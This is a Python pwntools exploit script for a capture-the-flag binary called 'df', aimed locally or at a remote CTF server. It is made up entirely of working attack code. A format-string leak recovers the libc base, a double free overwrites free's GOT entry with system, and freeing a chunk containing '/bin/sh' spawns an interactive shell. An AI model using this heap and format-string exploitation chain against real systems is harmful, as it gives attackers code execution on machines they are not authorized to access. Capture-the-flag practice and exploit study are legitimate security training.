#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
# context(log_level="debug", arch="i386", os="linux")
if debug == 1:
    p = process('./df')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('tasks.open.kksctf.ru', 10000)
    libc = ELF('./libc.so.6', checksec=False)
elf = ELF('./df', checksec=False)
got_free = elf.got['free']


def allocate(allocate_idx, allocate_size, allocate_message):
    p.sendlineafter('>', '1')
    p.sendlineafter('Enter chunk ID: ', str(allocate_idx))
    p.sendlineafter('Enter chunk size: ', str(allocate_size))
    p.sendlineafter('Your message: ', allocate_message)
    p.sendlineafter('Done!\n', '')


def free(free_idx):
    p.sendlineafter('>', '3')
    p.sendlineafter('Enter chunk ID: ', str(free_idx))


allocate(0, 0x20, '%13$p')
p.sendlineafter('>', '2')
addr___libc_start_main = int(p.recv(10), 16) - 241
libcbase = addr___libc_start_main - libc.sym['__libc_start_main']
addr_system = libcbase + libc.sym['system']
free(0)
allocate(0, 0x20, p32(got_free))
free(0)
allocate(1, 0x40, '%3d%6$hhn')
p.sendlineafter('>', '2')
free(0)
allocate(2, 0x40, '/bin/sh\x00')
allocate(3, 0x20, p32(got_free))
allocate(4, 0x20, p32(got_free))
allocate(5, 0x20, p32(addr_system))
success('got_free    = ' + hex(got_free))
success('addr_system = ' + hex(addr_system))
free(2)
# gdb.attach(p)
p.interactive()
